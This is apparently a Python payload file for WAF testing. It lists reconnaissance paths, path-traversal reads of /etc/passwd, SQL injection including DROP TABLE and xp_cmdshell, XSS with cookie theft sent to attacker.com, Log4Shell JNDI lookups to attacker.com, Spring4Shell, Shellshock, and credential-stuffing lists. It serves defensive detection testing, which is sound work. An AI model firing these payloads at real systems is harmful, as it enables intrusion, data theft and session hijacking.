"""
payloads.py — All attack payloads organised by scenario type.
Add or remove entries here to tune what Cloudflare sees.
"""

PAYLOADS = {

    # ── Scenario 1: Reconnaissance ──────────────────────────────────────────
    # Simulates an attacker mapping the environment before striking.
    "recon_paths": [
        "/admin", "/admin/login", "/administrator", "/admin/config",
        "/wp-admin", "/wp-login.php", "/wp-config.php",
        "/.env", "/.env.backup", "/.git/config", "/.git/HEAD",
        "/config.php", "/config.yml", "/config.json",
        "/phpinfo.php", "/info.php", "/test.php",
        "/backup.zip", "/backup.tar.gz", "/db.sql", "/database.sql",
        "/phpmyadmin", "/mysql", "/adminer.php",
        "/server-status", "/server-info",
        "/api/v1/users", "/api/v1/admin", "/api/admin",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
        "/../../../etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/etc/passwd", "/etc/shadow",
        "/.htaccess", "/web.config", "/crossdomain.xml",
    ],

    # User-agents that look like known scanners — Cloudflare Bot Management fires on these
    "scanner_agents": [
        "sqlmap/1.7.8#stable (https://sqlmap.org)",
        "Nikto/2.1.6",
        "Nmap Scripting Engine",
        "masscan/1.3.2",
        "python-requests/2.28.0",
        "Go-http-client/1.1",
        "zgrab/0.x",
        "WPScan v3.8.22",
        "Acunetix-Aspect-Security/1.0",
        "DirBuster-1.0-RC1",
    ],

    # ── Scenario 2: SQL Injection ────────────────────────────────────────────
    # Simulates database exfiltration attempts. OWASP Core Ruleset fires here.
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1; DROP TABLE users--",
        "1; SELECT * FROM information_schema.tables--",
        "' UNION SELECT null,username,password FROM users--",
        "' UNION SELECT null,table_name,null FROM information_schema.tables--",
        "1' AND SLEEP(5)--",
        "1 AND 1=1",
        "' OR 1=1#",
        "admin'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' ORDER BY 3--",
        "1' GROUP BY 1--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
        "IF(1=1, SLEEP(5), 0)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ],

    # ── Scenario 3: XSS ─────────────────────────────────────────────────────
    # Cross-site scripting — often used for session hijacking.
    "xss": [
        "<script>alert('XSS')</script>",
        "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "javascript:alert(document.cookie)",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    ],

    # ── Scenario 4: Zero-Day / CVE Exploitation ──────────────────────────────
    # Log4Shell, Spring4Shell, Shellshock — enterprise WAF signature rules fire.
    "zero_day": [
        {
            "label": "Log4Shell (CVE-2021-44228)",
            "ua": "${jndi:ldap://attacker.com/Exploit}",
            "header_value": "${jndi:ldap://192.168.1.1:1389/a}",
        },
        {
            "label": "Log4Shell obfuscated",
            "ua": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/poc}",
            "header_value": "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/exploit}",
        },
        {
            "label": "Spring4Shell (CVE-2022-22965)",
            "ua": "Mozilla/5.0",
            "header_value": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))",
        },
        {
            "label": "Shellshock (CVE-2014-6271)",
            "ua": "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd",
            "header_value": "() { ignored; }; echo Content-Type: text/html; echo; echo vulnerable",
        },
        {
            "label": "PHPUnit RCE (CVE-2017-9841)",
            "ua": "Mozilla/5.0",
            "header_value": "<?php system('id'); ?>",
        },
    ],

    # ── Credential stuffing usernames/passwords ──────────────────────────────
    "usernames": [
        "admin", "administrator", "root", "user", "test", "guest",
        "info", "support", "webmaster", "operator", "sysadmin",
        "john.doe", "jane.smith", "ceo", "finance", "hr",
    ],
    "passwords": [
        "password", "Password1", "123456", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "qwerty",
        "Summer2023!", "Winter2024!", "Company123!", "P@ssw0rd",
    ],
}
